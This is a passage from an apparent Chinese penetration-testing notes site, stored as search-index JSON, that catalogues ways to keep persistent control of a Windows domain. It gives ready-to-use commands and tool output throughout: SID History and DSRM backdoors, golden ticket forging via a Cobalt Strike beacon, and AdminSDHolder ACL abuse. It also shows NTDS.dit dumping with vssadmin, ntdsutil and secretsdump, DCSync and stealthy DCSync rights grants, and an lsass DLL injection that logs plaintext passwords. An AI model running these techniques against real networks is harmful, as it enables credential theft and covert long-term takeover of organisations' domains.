history:\u5f53\u6211\u4eec\u628a\u57dfA\u7684\u7528\u6237x\u8fc1\u79fb\u5230\u57dfB\u65f6\uff0cB\u57df\u4e2dx\u7684sid\u4f1a\u53d1\u751f\u6539\u53d8\uff0c\u968f\u5373\u800c\u6765\u7684\u662f\u6743\u9650\u4e5f\u4f1a\u53d1\u751f\u6539\u53d8\u3002\u6240\u4ee5\u4e3a\u4e86\u907f\u514d\u8fd9\u79cd\u6743\u9650\u6539\u53d8\uff0csid history\u8bde\u751f\u4e86\uff0c \u7cfb\u7edf\u4f1a\u5c06\u5176\u539f\u6765\u7684SID\u6dfb\u52a0\u5230\u8fc1\u79fb\u540e\u7528\u6237\u7684SID History\u5c5e\u6027\u4e2d\uff0c\u4f7f\u8fc1\u79fb\u540e\u7684\u7528\u6237\u4fdd\u6301\u539f\u6709\u6743\u9650\u3001\u80fd\u591f\u8bbf\u95ee\u5176\u539f\u6765\u53ef\u4ee5\u8bbf\u95ee\u7684\u8d44\u6e90 \u3002 \u5728\u57df\u63a7\u4e0a privilege::debug sid::patch sid::add /sam:const27 /new:administrator \u5c06administrator\u7684SID\u6dfb\u52a0\u5230const27\u7684sid history\u5c5e\u6027 \u7136\u540e\u53ef\u4ee5\u5728\u57df\u63a7\u4e0a\u9a8c\u8bc1\u5176sid history\u662f\u5426\u66f4\u6539\u6210\u529f Import-Module activedirectory Get-ADUser const27 -Properties sidhistory \u53ef\u4ee5\u53d1\u73b0\u73b0\u5728\u662f\u6709SIDHistory\u5c5e\u6027\u4e86\u3002\u800c\u4e14\u672b\u5c3e\u7684500\u9884\u793a\u7740ADMIN\u6743\u9650 DSRM\u540e\u95e8 DSRM\u8d26\u53f7:\u6bcf\u4e2a\u57df\u63a7\u4e0a\u90fd\u6709\u4e00\u4e2a\u672c\u5730\u7ba1\u7406\u5458\u8d26\u6237\u4e5f\u5c31\u662fDSRM\u8d26\u6237\uff0c\u7528\u4e8e\u5728\u57df\u73af\u5883\u51fa\u73b0\u6545\u969c\u65f6\u672c\u5730\u767b\u5f55\u8fdb\u884c\u4fee\u590d.\u53ef\u4ee5\u5229\u7528\u8fd9\u4e2a\u8d26\u6237\u8fdb\u884c\u6301\u4e45\u5316\u64cd\u4f5c\u3002\uff08 \u5982\u679c\u57df\u63a7\u5236\u5668\u7684\u7cfb\u7edf\u7248\u672c\u4e3aWindows Server 2003\uff0c\u5219\u4e0d\u80fd\u4f7f\u7528\u8be5\u65b9\u6cd5\u8fdb\u884c\u6301\u4e45\u5316\u64cd\u4f5c\u3002 \uff09 \u6211\u4eec\u5148\u8bbe\u7f6eDSRM\u5bc6\u7801 \u57df\u63a7\u4e0a\u8f93\u5165ntdsutil \u7136\u540e\u8f93\u5165reset password on server null \u7136\u540e\u952e\u5165\u5bc6\u7801\uff0c\u6700\u540e\u6309q\u9000\u51fa\u5373\u53ef \u5728mimikatz\u4e2ddump\u672c\u5730hash\u53ef\u4ee5\u770b\u5230\u591a\u51fa\u6765\u4e2aAdministrator \u7136\u540e\u8bbe\u7f6eDSRM\u767b\u9646\u65b9\u5f0f DSRM\u767b\u9646\u65b9\u5f0f\u6709\u4e09\u79cd\u5206\u522b\u5bf9\u5e94123. 0\uff1a\u9ed8\u8ba4\u503c\uff0c\u53ea\u6709\u5f53\u57df\u63a7\u5236\u5668\u91cd\u542f\u5e76\u8fdb\u5165DSRM\u6a21\u5f0f\u65f6\uff0c\u624d\u53ef\u4ee5\u4f7f\u7528DSRM\u7ba1\u7406\u5458\u8d26\u53f7 1\uff1a\u53ea\u6709\u5f53\u672c\u5730AD\u3001DS\u670d\u52a1\u505c\u6b62\u65f6\uff0c\u624d\u53ef\u4ee5\u4f7f\u7528DSRM\u7ba1\u7406\u5458\u8d26\u53f7\u767b\u5f55\u57df\u63a7\u5236\u5668 2\uff1a\u5728\u4efb\u4f55\u60c5\u51b5\u4e0b\uff0c\u90fd\u53ef\u4ee5\u4f7f\u7528DSRM\u7ba1\u7406\u5458\u8d26\u53f7\u767b\u5f55\u57df\u63a7\u5236\u5668 \u6211\u4eec\u9700\u8981\u5c06\u4ed6\u6539\u62102\u624d\u884c\u3002powershell\u6267\u884c New-ItemProperty \"hklm:\\system\\currentcontrolset\\control\\lsa\\\" -name \"dsrmadminlogonbehavior\" -value 2 -propertyType DWORD \u5373\u53ef.\u7136\u540e\u76f4\u63a5psexec\u767b\u5f55(\u8fd9\u91cc\u7528\u7684\u662fcs) \u6ce8\u610f\u586bRealm\u65f6\u8981\u586b\u4e0a\u9762dump\u51fasam\u65f6\u7684\u57df\u540d\uff08\u8fd9\u91cc\u662fDC\uff09 \u59d4\u6d3e\u540e\u95e8 \u8fd9\u4e2a\u5f88\u7b80\u5355\uff0c\u5229\u7528\u7ea6\u675f\u6027\u59d4\u6d3e\u6216\u8005\u57fa\u4e8e\u8d44\u6e90\u7684\u7ea6\u675f\u6027\u59d4\u6d3e\u653b\u51fb\u5f97\u5230\u7684ST2\u4fdd\u5b58\u8d77\u6765\uff0c\u6216\u8005\u975e\u7ea6\u675f\u6027\u59d4\u6d3e\u5f97\u5230\u7684TGT\uff0c\u8981\u7528\u7684\u65f6\u5019\u52a0\u8f7d\u8fdb\u5185\u5b58\u5c31\u884c\u4e86 \u9ec4\u91d1\u7968\u636e\u751f\u6210 #\u63d0\u6743 privilege::debug #\u751f\u6210\u9ec4\u91d1\u7968\u636e\u5e76\u5bfc\u5165 kerberos::golden /user:administrator /domain:const.com /sid:\u5f53\u524d\u7528\u6237sid\u53bb\u6389\u6700\u540e\u4e00\u4e2a\u6570\u636e /krbtgt:krbtgt\u7684hash /ptt cs beacon> mimikatz kerberos::golden /user:Administrator /domain:ocean.com /sid:S-1-5-21-436250240-237335239-2342608000 /krbtgt:31d6cfe0d16ae931b73c59d7e0c089c0 /endin:480 /renewmax:10080 /ptt [*] Tasked beacon to run mimikatz's kerberos::golden /user:Administrator /domain:ocean.com /sid:S-1-5-21-436250240-237335239-2342608000 /krbtgt:31d6cfe0d16ae931b73c59d7e0c089c0 /endin:480 /renewmax:10080 /ptt command [+] host called home, sent: 438858 bytes [+] received output: User : Administrator Domain : ocean.com (OCEAN) SID : S-1-5-21-436250240-237335239-2342608000 User Id : 500 Groups Id : *513 512 520 518 519 ServiceKey: 31d6cfe0d16ae931b73c59d7e0c089c0 - rc4_hmac_nt Lifetime : 2021/12/6 15:46:14 ; 2021/12/6 23:46:14 ; 2021/12/13 15:46:14 -> Ticket : ** Pass The Ticket ** * PAC generated * PAC signed * EncTicketPart generated * EncTicketPart encrypted * KrbCred generated Golden ticket for 'Administrator @ ocean.com' successfully submitted for current session AdminSDHolder AdminSDHolder\u662f\u4e00\u4e2a\u7279\u6b8a\u5bb9\u5668\uff0c\u7528\u4f5c\u53d7\u4fdd\u62a4\u7528\u6237\u6216\u7ec4\u7684ACM\u6a21\u677f\u3002AD\u5b9a\u671f\u628a AdminSDHolder\u5bf9\u8c61\u7684ACL \u5e94\u7528\u5230\u6240\u6709\u53d7\u4fdd\u62a4\u7528\u6237\u6216\u7ec4\u4e0a\uff0c\u9632\u6b62\u5176\u88ab\u6709\u610f\u6216\u6545\u610f\u4fee\u6539\u3002 \u5982\u679c\u80fd\u591f\u4fee\u6539AdminSDHolder\u5bf9\u8c61\u7684ACL\uff0c\u90a3\u4e48\u4fee\u6539\u7684\u6743\u9650\u5c06\u81ea\u52a8\u5e94\u7528\u4e8e\u6240\u6709\u53d7\u4fdd\u62a4\u7684AD\u8d26\u6237\u548c\u7ec4\uff0c\u8fd9\u53ef\u4ee5\u4f5c\u4e3a\u4e00\u4e2a\u57df\u73af\u5883\u6743\u9650\u7ef4\u6301\u7684\u65b9\u6cd5 \u3002 \u5982\u4f55\u5bfb\u627e\u53d7\u4fdd\u62a4\u7528\u6237\u6216\u7ec4\uff1a \u53d7\u4fdd\u62a4\u7528\u6237\u6216\u7ec4\u7684 AdminCount\u5c5e\u6027\u4e3a1 \u3002 \u4f46\u662f\uff0c\u5982\u679c\u5bf9\u8c61\u5df2\u79fb\u51fa\u53d7\u4fdd\u62a4\u7ec4\uff0c\u5176AdminCount\u5c5e\u6027\u4ecd\u4e3a1\uff0c\u4e5f\u5c31\u662f\u8bf4\uff0c\u6709\u53ef\u80fd\u83b7\u5f97\u66fe\u7ecf\u662f\u53d7\u4fdd\u62a4\u7ec4\u7684\u5e10\u6237\u548c\u7ec4 \u3002 \u4f7f\u7528powerview.ps1 Get-NetUser -AdminCount \u5373\u53ef\u83b7\u5f97\u53d7\u4fdd\u62a4\u7528\u6237 Get-NetGroup -AdminCount \u5373\u53ef\u83b7\u5f97\u53d7\u4fdd\u62a4\u7ec4 \u5982\u4f55\u4fee\u6539ADMINSDHOLDER\u7684ACL \u57df\u7ba1\u6267\u884c\u4ee5\u4e0b\u547d\u4ee4(powerview.ps1) Add-DomainObjectAcl -TargetSearchBase \"LDAP://CN=AdminSDHolder,CN=System,DC=CONST,DC=COM\" -PrincipalIdentity xx -Verbose -Rights ALL \u7ed9AdminSDHoloder\u6dfb\u52a0\u4e00\u6761ACL,\u8ba9xx\u7528\u6237\u83b7\u5f97\u5b8c\u5168\u63a7\u5236\u6743 \u7136\u540e\u9ed8\u8ba4\u7b4960\u5206\u949f\uff0c\u5f85ADMINSDHOLDER\u751f\u6548\u540e\uff0cxx\u5c31\u83b7\u5f97\u6240\u6709\u53d7\u4fdd\u62a4\u5bf9\u8c61\u7684\u5b8c\u5168\u63a7\u5236\u6743\u4e86 Ntds.dit \"Ntds.dit\u6587\u4ef6\u662f\u57df\u73af\u5883\u4e2d\u57df\u63a7\u4e0a\u4f1a\u6709\u7684\u4e00\u4e2a\u4e8c\u8fdb\u5236\u6587\u4ef6\uff0c\u662f\u4e3b\u8981\u7684\u6d3b\u52a8\u76ee\u5f55\u6570\u636e\u5e93\uff0c\u5176\u6587\u4ef6\u8def\u5f84\u4e3a\u57df\u63a7\u7684 %SystemRoot%\\ntds\\ntds.dit\uff0c\u6d3b\u52a8\u76ee\u5f55\u59cb\u7ec8\u4f1a\u8bbf\u95ee\u8fd9\u4e2a\u6587\u4ef6\uff0c\u6240\u4ee5\u6587\u4ef6\u7981\u6b62\u88ab\u8bfb\u53d6\u3002Ntds.dit\u5305\u62ec\u4f46\u4e0d\u9650\u4e8e\u6709\u5173\u57df\u7528\u6237\u3001\u7ec4\u548c\u7ec4\u6210\u5458\u8eab\u4efd\u548c\u51ed\u636e\u4fe1\u606f\u3001GPP\u7b49\u4fe1\u606f\u3002\u5b83\u5305\u62ec\u57df\u4e2d\u6240\u6709\u7528\u6237\u7684\u5bc6\u7801\u54c8\u5e0c\u503c\uff0c\u4e3a\u4e86\u8fdb\u4e00\u6b65\u4fdd\u62a4\u5bc6\u7801\u54c8\u5e0c\u503c\uff0c\u4f7f\u7528\u5b58\u50a8\u5728SYSTEM\u6ce8\u518c\u8868\u914d\u7f6e\u5355\u5143\u4e2d\u7684\u5bc6\u94a5\u5bf9\u8fd9\u4e9b\u54c8\u5e0c\u503c\u8fdb\u884c\u52a0\u5bc6\u3002\"\u2014\u2014FREEBUF.whoami\u300a\u5185\u7f51\u6e17\u900f\u6d4b\u8bd5\uff1a\u4eceNTDS.dit\u83b7\u53d6\u57df\u6563\u5217\u503c\u300b \u63d2\u4e2a\u9898\u5916\u8bdd\uff1a\u975e\u57df\u7684\u5de5\u4f5c\u7ec4\u4e3b\u673a\u5176\u5bc6\u7801\u7b49\u4fe1\u606f\u5b58\u50a8\u5728SAM\u4e2d\u3002 \u6211\u4eec\u83b7\u53d6\u4e86\u57df\u63a7\u540e\u4e00\u822c\u7b2c\u4e00\u6b65\u4fbf\u662f\u5bfc\u51faNtds.dit\u4e2d\u7684\u4fe1\u606f,\u600e\u4e48\u5bfc\u51fa\u5462\uff1f \u5229\u7528VSS\u5bfc\u51fa VSS\u5168\u79f0\u4e3aVolume Shadow Copy Service\uff0c\u5377\u5f71\u62f7\u8d1d\u670d\u52a1\uff0c\u5c5e\u4e8e\u5feb\u7167\u6280\u672f\u7684\u4e00\u79cd\uff0c\u4e3b\u8981\u7528\u4e8e\u5907\u4efd\u548c\u6062\u590d\uff0c\u5373\u4f7f\u6587\u4ef6\u5904\u4e8e\u88ab\u9501\u5b9a\u72b6\u6001\u3002 \u5176\u83b7\u53d6NTDS.DIT\u7684\u57fa\u672c\u6b65\u9aa4\u4e3a\uff1a \u521b\u5efa\u76ee\u6807\u4e3b\u673a\u6240\u6709\u6587\u4ef6\u7684\u5377\u5f71\u62f7\u8d1d\u3002 \u5728\u521b\u5efa\u7684\u5377\u5f71\u62f7\u8d1d\u4e2d\u590d\u5236\u51faNTDS.DIT\u3002 \u5220\u9664\u5377\u5f71\u62f7\u8d1d\u3002 VSSADMIN vssadmin\u662fwindows\u4e0a\u4e00\u4e2a\u547d\u4ee4\u884c\u5377\u5f71\u62f7\u8d1d\u670d\u52a1\u7ba1\u7406\u5de5\u5177\u3002\u5176\u9002\u7528\u4e8e\uff1a Windows 10\uff0cWindows 8.1\uff0cWindows Server 2016\uff0cWindows Server 2012 R2\uff0cWindows Server 2012\uff0cWindows Server 2008 R2\uff0cWindows Server 2008 \u5176\u5bfc\u51faNTDS.DIT\u7684\u65b9\u6cd5\u5982\u4e0b \u521b\u5efa\u4e00\u4e2aC\u76d8\u7684\u5377\u5f71\u62f7\u8d1d vssadmin create shadow /for=c: \u7136\u540e\u5c06\u5377\u5f71\u4e2d\u7684ntds.dit\u590d\u5236\u51fa\u6765 copy \\\\?\\GLOBALROOT\\Device\\HarddiskVolumeShadowCopy1\\windows\\ntds\\ntds.dit C:\\ntds.dit \u7136\u540e\u5220\u9664\u5377\u5f71 vssadmin delete shadows /for=c: /quiet Ntdsutil.exe Ntdsutil.exe \u662f\u4e00\u4e2a\u4e3a Active Directory \u63d0\u4f9b\u7ba1\u7406\u8bbe\u65bd\u7684\u547d\u4ee4\u884c\u5de5\u5177\uff0c\u8be5\u5de5\u5177\u88ab\u9ed8\u8ba4\u5b89\u88c5\u5728\u4e86\u57df\u63a7\u5236\u5668\u4e0a\uff0c\u53ef\u4ee5\u5728\u57df\u63a7\u4e0a\u76f4\u63a5\u64cd\u4f5c\uff0c\u4e5f\u53ef\u4ee5\u901a\u8fc7\u57df\u5185\u673a\u5668\u5728\u57df\u63a7\u4e0a\u8fdc\u7a0b\u64cd\u4f5c\uff0c\u4f46\u662f\u9700\u8981\u7ba1\u7406\u5458\u6743\u9650\u3002 \u4e3aWINDOWS\u4e0a\u6240\u6709\u6587\u4ef6\u521b\u5efa\u5feb\u7167 ntdsutil snapshot \"activate instance ntds\" create quit quit \u6211\u4eec\u5f97\u5230\u4e86\u4e2a\u5feb\u7167\u7684ID\uff0c\u63a5\u4e0b\u6765\u6211\u4eec\u5c31\u9700\u8981\u52a0\u8f7d\u8fd9\u4e2a\u5377\u5f71\u5230\u6211\u4eec\u7684\u78c1\u76d8\u4e2d ntdsutil snapshot \"mount {bdccff3c-810c-4f78-9d80-c6729910e83a}\" quit quit \u6267\u884c\u540e\u5c31\u4f1a\u53d1\u73b0\u8fd9\u4e2a\u5feb\u7167\u52a0\u8f7d\u5230\u4e86C\u76d8\u4e0b\uff08\u8fd9\u91ccdir\u770b\u5230\u7684NTDS.DIT\u4e0e\u672c\u6b21\u5b9e\u9a8c\u65e0\u5173\uff0c\u662f\u4e0a\u6b21\u5b9e\u9a8c\u6b8b\u7559\u4e0b\u6765\u6ca1\u5220\u7684\uff09 \u7136\u540e\u5c06ntds.dit\u590d\u5236\u51fa\u6765 copy c:\\$SNAP_202107291703_VOLUMEC$\\Windows\\NTDS\\ntds.dit c:\\ntds.dit \u7136\u540e\u5220\u9664\u5feb\u7167 ntdsutil snapshot \"mount {bdccff3c-810c-4f78-9d80-c6729910e83a}\" \"delete {bdccff3c-810c-4f78-9d80-c6729910e83a}\" quit quit \u540c\u65f6\uff0cNTDSUTIL\u8fd8\u6709\u4e00\u4e2a\u66f4\u52a0\u4fbf\u6377\u7684\u5bfc\u51fantds.dit\u7684\u65b9\u6cd5\uff1a\u901a\u8fc7IFM IFM\u4e2d\u6587\u53eb\u5a92\u4f53\u5b89\u88c5\u96c6\uff0c\u5728\u6211\u4eec\u901a\u8fc7NTDSUTIL\u6765\u521b\u5efa\u5a92\u4f53\u5b89\u88c5\u96c6\u65f6\uff0c\u4f1a\u81ea\u52a8\u8fdb\u884c\u751f\u6210\u5feb\u7167\u3001\u52a0\u8f7d\u3001\u5c06ntds.dit\u3001\u8ba1\u7b97\u673a\u7684SAM\u548cSYSTEM\u6587\u4ef6\u590d\u5236\u5230\u76ee\u6807\u6587\u4ef6\u5939\u4e2d\u7b49\u64cd\u4f5c\uff0c\u9700\u7ba1\u7406\u5458\u6743\u9650\u3002 ntdsutil \"ac i ntds\" \"ifm\" \"create full c:/test\" q q \u7136\u540e\u5728C:\\test\\Active Directory\\ntds.dit\uff0c\u5c31\u662fNTDS.DIT\uff0c\u6211\u4eec\u590d\u5236\u51fa\u6765\u5c31\u884c\u4e86\u3002 \u7136\u540e\u518d\u628atest\u6587\u4ef6\u5939\u5220\u9664\u5373\u53ef\u3002 \u89e3\u6790NTDS.DIT \u5728\u63d0\u53d6NTDS.DIT\u540e\uff0c\u6211\u4eec\u9700\u8981\u518d\u63d0\u53d6\u4e00\u4e2a\u6587\u4ef6system.hive\uff0c\u56e0\u4e3asystem.hive\u4e2d\u5b58\u653e\u7740NTDS.DIT\u7684\u5bc6\u94a5\uff0c\u6709\u4e86\u5b83\u6211\u4eec\u624d\u80fd\u89e3\u6790NTDS.DIT\u3002 \u53ef\u4ee5\u7528\u521a\u521a\u63d0\u5230\u7684VSS\u65b9\u6cd5\u83b7\u53d6\uff0c\u4e5f\u53ef\u4ee5\u76f4\u63a5\u7528\u4ee5\u4e0b\u547d\u4ee4\u4ece\u6ce8\u518c\u8868\u4e2d\u62c9\u53d6. reg save hklm\\system c:\\system.hive Impacket impacket\u6846\u67b6\u96c6\u6210\u4e86\u8bb8\u591a\u597d\u73a9\u7684\u4e1c\u897f\uff0c\u4ed6\u5176\u4e2d\u7684secretdump.py\u811a\u672c\u5b9e\u73b0\u4e86\u89e3\u6790ntds.dit\u7684\u529f\u80fd \u76f4\u63a5\u518dimpacket\u7684example\u4e0b python .\\secretsdump.py -system .\\system.hive -ntds .\\ntds.dit local \u8fdc\u7a0b\u89e3\u6790 DCSYNC \"DCSync\u662fMimikatz\u57282015\u5e74\u6dfb\u52a0\u7684\u4e00\u4e2a\u529f\u80fd\uff0c\u7531Benjamin DELPY gentilkiwi\u548cVincent LE TOUX\u5171\u540c\u7f16\u5199\uff0c\u5176\u80fd\u591f\u5229\u7528\u5377\u5f71\u62f7\u8d1d\u670d\u52a1\u76f4\u63a5\u8bfb\u53d6ndts.dit\u5e76\u5bfc\u51fa\u57df\u5185\u6240\u6709\u7528\u6237\u7684\u54c8\u5e0c\u503c\u3002\u9700\u8981\u7ba1\u7406\u5458\u6743\u9650\u3002\" \u8fd9\u4e2a\u4e1c\u897f \u53ef\u4ee5\u5b9e\u73b0\u4e0d\u767b\u5f55\u5230\u57df\u63a7\u800c\u83b7\u53d6\u57df\u63a7\u4e0a\u7684\u6570\u636e \u83b7\u5f97\u4ee5\u4e0b\u6743\u9650\u5c31\u53ef\u4ee5\u4f7f\u7528\u4e86 Administrators\u7ec4\u5185\u7684\u7528\u6237 Domain Admins\u7ec4\u5185\u7684\u7528\u6237 Enterprise Admins\u7ec4\u5185\u7684\u7528\u6237 \u57df\u63a7\u5236\u5668\u7684\u8ba1\u7b97\u673a\u5e10\u6237 \u7136\u540e\u5728mimikatz\u91cc privilege::debug lsadump::dcsync /user:xxxx /domain:xxxxx /csv \u5373\u53ef \u60f3\u83b7\u53d6\u5168\u90e8hash\u4e5f\u53ef\u4ee5lsadump::dcsync /domain:xxx.com /all /csv \u7136\u540e\u6211\u4eec\u5c31\u53ef\u4ee5\u901a\u8fc7krbtgt hash\u5236\u4f5c\u9ec4\u91d1\u7968\u636e\u767b\u5f55administrator\u3002 \u5982\u679c\u8fd8\u60f3\u9690\u853d\u4e00\u70b9\uff0c\u53ef\u4ee5\u7ed9\u666e\u901a\u7528\u6237\u6dfb\u52a0\u5982\u4e0bACE,\u4f7f\u5176\u83b7\u5f97dcsync\u6743\u9650 - - DS-Replication-Get-Changes(GUID:1131f6aa-9c07-11d1-f79f-00c04fc2dcd2) - DS-Replication-Get-Changes-All(GUID:1131f6ad-9c07-11d1-f79f-00c04fc2dcd2) - DS-Replication-Get-Changes(GUID:89e95b76-444d-4c62-991a-0facbeda640c) \u53ef\u4ee5\u4ee5\u7ba1\u7406\u5458\u6743\u9650\u8fd0\u884cpowerview.ps1\u5b8c\u6210\u4ee5\u4e0a\u64cd\u4f5c #\u7ed9\u57df\u7528\u6237hack\u6dfb\u52a0\u4ee5\u4e0a\u4e09\u6761ACE Add-DomainObjectAcl -TargetIdentity \"DC=xie,DC=com\" -PrincipalIdentity hack -Rights DCSync -Verbose #\u7ed9\u57df\u7528\u6237hack\u5220\u9664\u4ee5\u4e0a\u4e09\u6761ACE Remove-DomainObjectAcl -TargetIdentity \"DC=xie,DC=com\" -PrincipalIdentity hack -Rights DCSync -Verbose \u7136\u540e\u666e\u901a\u7528\u6237\u4e5f\u53ef\u4ee5\u7528mimikatz\u8c03\u7528dcsync\u5bfc\u51fahash\u4e86 DCSYNC\u7684powershell\u5b9e\u73b0 mimikatz\u514d\u6740\u8fc7\u4e0d\u53bb\u7684\u8bdd\u53ef\u4ee5\u8bd5\u8bd5\u8fd9\u4e2a https://gist.github.com/monoxgas/9d238accd969550136db#file-invoke-dcsync-ps1 Import-Module .\\Invoke-DCSync.ps1 Invoke-DCSync -DumpForest | ft -wrap -autosize // \u5bfc\u51fa\u57df\u5185\u6240\u6709\u7528\u6237\u7684hash Invoke-DCSync -DumpForest -Users @(\"administrator\") | ft -wrap -autosize // \u5bfc\u51fa\u57df\u5185administrator\u8d26\u6237\u7684hash \u6211\u8fd9\u91ccWIN10\u57df\u63a7\u6253\u4e0d\u901a\uff0c\u4e0d\u77e5\u9053\u4e3a\u5565 \u914d\u5408EXCHANGE\u7528\u6237\u8fbe\u5230\u57df\u63d0\u6743\u76ee\u7684 exchange\u5b89\u88c5\u540e\u4f1a\u5728AD\u4e0a\u751f\u6210\u4e24\u4e2a\u5bb9\u5668 \u5176\u4e2dexchange windows permissions\u7ec4\u7684\u7528\u6237\u62e5\u6709writeDACL\u6743\u9650\uff0c Exchange Trusted Subsystem \u662f Exchange Windows Permission \u7684\u6210\u5458\uff0c\u80fd\u7ee7\u627fwritedacl\u6743\u9650\uff0c\u6709\u8fd9\u4e2a\u6743\u9650\u540e\u5c31\u80fd\u4f7f\u7528dcsync\u5bfc\u51fa\u6240\u6709\u7528\u6237hash\u3002 \u5176\u4e2dexchange trusted subsystem\u7ec4\u751a\u81f3\u53ef\u80fd\u6709\u7ee7\u627f\u81eaadministrators\u7ec4\u7684\u6743\u9650\u3002 \u540c\u65f6\uff0c\u5728\u5b89\u88c5exchange\u540e\u8fd8\u4f1a\u751f\u6210\u4e00\u4e2a\u7ec4Organization Management\uff0c\u8fd9\u4e2a\u7ec4\u53ef\u4ee5\u4fee\u6539\u5176\u4ed6exchange\u7ec4\u7684\u7528\u6237\u4fe1\u606f\u3002 \u5f53\u7136\u4e5f\u53ef\u4ee5\u4fee\u6539Exchange Trusted Subsystem\u7ec4\u7684\u6210\u5458\u4fe1\u606f\uff0c\u6bd4\u5982\u5411\u91cc\u9762\u52a0\u4e00\u4e2a\u4ee5\u83b7\u5f97\u7684\u7528\u6237\u3002 \u7efc\u4e0a\u6240\u8ff0\uff0c\u53ea\u8981\u83b7\u5f97Organization Management,Exchange Trusted Subsystem,Exchange Windows Permission,\u5c31\u53ef\u4ee5\u901a\u8fc7dcsync\u6765\u83b7\u53d6\u6574\u4e2a\u57df\u6743\u9650\u3002 \u5f53\u7136\uff0c\u60f3\u83b7\u5f97\u4e0a\u8ff0\u7ec4\u7528\u6237\u6743\u9650\uff0c\u8fd8\u662f\u4e0d\u592a\u5bb9\u6613\u7684\u3002 \u5229\u7528\u8bc1\u4e66\u6a21\u7248","title":"\u57df\u6743\u9650\u7ef4\u6301\u901a\u7528\u65b9\u6cd5\u603b\u6c47"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%9F%9F%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E9%80%9A%E7%94%A8%E6%96%B9%E6%B3%95%E6%80%BB%E6%B1%87/%E5%9F%9F%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E9%80%9A%E7%94%A8%E6%96%B9%E6%B3%95%E6%80%BB%E6%B1%87/#_1","text":"","title":"\u57df\u6743\u9650\u7ef4\u6301\u901a\u7528\u65b9\u6cd5\u603b\u6c47"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%9F%9F%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E9%80%9A%E7%94%A8%E6%96%B9%E6%B3%95%E6%80%BB%E6%B1%87/%E5%9F%9F%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E9%80%9A%E7%94%A8%E6%96%B9%E6%B3%95%E6%80%BB%E6%B1%87/#_2","text":"Hook PasswordChangeNotify \u4e07\u80fd\u5bc6\u7801 SSP\u6ce8\u5165 SID History\u540e\u95e8 DSRM\u540e\u95e8 \u59d4\u6d3e\u540e\u95e8 \u9ec4\u91d1\u7968\u636e\u751f\u6210 AdminSDHolder Ntds.dit \u5229\u7528VSS\u5bfc\u51fa VSSADMIN Ntdsutil.exe \u89e3\u6790NTDS.DIT Impacket \u8fdc\u7a0b\u89e3\u6790 DCSYNC DCSYNC\u7684powershell\u5b9e\u73b0 \u914d\u5408EXCHANGE\u7528\u6237\u8fbe\u5230\u57df\u63d0\u6743\u76ee\u7684 \u5229\u7528\u8bc1\u4e66\u6a21\u7248","title":"\u76ee\u5f55"},{"location":"%E6%B8%97%E9%80%8F/%E6%B8%97%E9%80%8F%E8%B7%AF%E5%BE%84%26%E6%B2%89%E6%B7%80/%E5%90%8E%E6%B8%97%E9%80%8F/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/%E5%9F%9F%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E9%80%9A%E7%94%A8%E6%96%B9%E6%B3%95%E6%80%BB%E6%B1%87/%E5%9F%9F%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E9%80%9A%E7%94%A8%E6%96%B9%E6%B3%95%E6%80%BB%E6%B1%87/#hook-passwordchangenotify","text":"\u539f\u7406\uff1a\u5f53\u7528\u6237\u4fee\u6539\u5bc6\u7801\u65f6\u4f1a\u8f93\u5165\u660e\u6587\u5bc6\u7801\uff0cLSA\u4f1a\u8c03\u7528PasswordChangeNotify \u5728\u7cfb\u7edf\u4e2d\u540c\u6b65\u5bc6\u7801\u3002\u6211\u4eecHOOK\u8fd9\u4e2a\u51fd\u6570\uff0c\u6539\u53d8\u5176\u884c\u4e3a\uff0c\u5c31\u80fd\u8fbe\u5230\u83b7\u53d6\u7528\u6237\u4fee\u6539\u540e\u7684\u5bc6\u7801\u7684\u660e\u6587. Tool: Powersploit\u4e0b\u7684Invoke-ReflectivePEInjection.ps1 \uff08\u7528\u4e8e\u6ce8\u5165\uff09 https://github.com/PowerShellMafia/PowerSploit \u4ee5\u53ca https://github.com/clymb3r/Misc-Windows-Hacking \u7684HookPasswordChange.dll(\u9700\u81ea\u884c\u7f16\u8bd1) Import-Module .\\Invoke-ReflectivePEInjection.ps1 Invoke-ReflectivePEInjection -PEPath HookPasswordChange.dll -procname lsass \u6267\u884c\u5982\u4e0a\u547d\u4ee4\uff0c\u53ea\u8981\u4fee\u6539\u4e86\u7528\u6237\u7684\u5bc6\u7801\uff0c\u4fee\u6539\u540e\u7684\u660e\u6587\u5bc6\u7801\u5c31\u4f1a\u8bb0\u5f55\u5728 C:\\Windows\\Temp\\passwords.txt \u6587\u4ef6\u4e2d\u3002 \u4e0b\u9762\u6211\u4eec\u5206\u6790\u4e00\u4e0b\u539f\u7406 \u5f53\u5bc6\u7801\u6539\u53d8\u8bf7\u6c42\u53d1\u751f\u65f6\uff0cLSA\u4f1a\u8c03\u7528Password Filters\u3002\u6bcf\u4e00\u4e2apassword filter\u4f1a\u5148\u9a8c\u8bc1\u65b0\u5bc6\u7801\u7684\u5408\u6cd5\u6027\u548c\u590d\u6742\u5ea6\uff0c\u7136\u540eLSA\u4f1a\u53d1\u51fa\u8bf7\u6c42\u5df2\u66f4\u6539\u7684\u4fe1\u53f7\u3002 \u8be5\u8fc7\u7a0b\u7531 password notification DLL \u5b8c\u6210\u3002\u6240\u4ee5\u6211\u4eec\u53ea\u9700\u8981\u52ab\u6301\u8fd9\u4e2aDLL\uff0c\u628a\u5b83\u6362\u6210\u6211\u4eec\u81ea\u5b9a\u4e49\u7684DLL\u5373\u53ef\u8fbe\u5230\u76ee\u7684\u3002 \u8fd9\u79cd\u65b9\u5f0f\u4e00\u822c\u5728Server\u670d\u52a1\u5668\u4e0a\u5229\u7528\u7387\u8f83\u9ad8 